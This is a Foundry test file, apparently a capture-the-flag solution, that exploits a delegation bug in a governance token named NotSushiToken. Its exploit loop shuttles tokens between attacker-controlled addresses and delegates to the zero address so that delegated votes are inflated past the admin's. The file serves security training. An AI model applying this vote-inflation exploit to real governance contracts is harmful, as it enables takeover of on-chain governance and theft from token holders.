// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {NotSushiToken} from "src/governance-shenanigans/NotSushiToken.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker'); // WLed address 1
    address o1 = makeAddr('o1'); // WLed address 2
    address o2 = makeAddr('o2'); // WLed address 3
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    NotSushiToken governanceToken;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // setting up governance token
        vm.prank(admin);
        governanceToken = new NotSushiToken();

        // --attacker sybil attack - got 3 controlled addresses WLed
        address[] memory addresses = new address[](4);
        addresses[0]=adminUser; addresses[1]=attacker;
        addresses[2]=o1; addresses[3]=o2;

        vm.prank(admin);
        governanceToken.addWledAddresses(addresses);

        vm.prank(admin);
        governanceToken.mint(adminUser,2_000e18);
        vm.prank(admin);
        governanceToken.mint(attacker,500e18);

        // adminUser delegates all votes to himself
        vm.prank(adminUser);
        governanceToken.delegate(adminUser);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}

        // implement solution here
        vm.prank(attacker);
        governanceToken.delegate(attacker);
        uint256 votes;
        while(votes <= governanceToken.getCurrentVotes(adminUser)) {
            vm.prank(attacker);
            governanceToken.transfer(o1, 500e18);
            vm.prank(o1);
            governanceToken.delegate(attacker);
            vm.prank(o1);
            governanceToken.transfer(attacker, 500e18);
            //balanceOf(o1)=0, delegating 0x0 that updates delegatee and skips if block in _moveDelegates 
            vm.prank(o1);
            governanceToken.delegate(address(0x0));
            votes = governanceToken.getCurrentVotes(attacker);        
        }        
        
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker gets more delegated votes than adminUser
        assertGt(
            governanceToken.getCurrentVotes(attacker),
            governanceToken.getCurrentVotes(adminUser)
        );

    }

}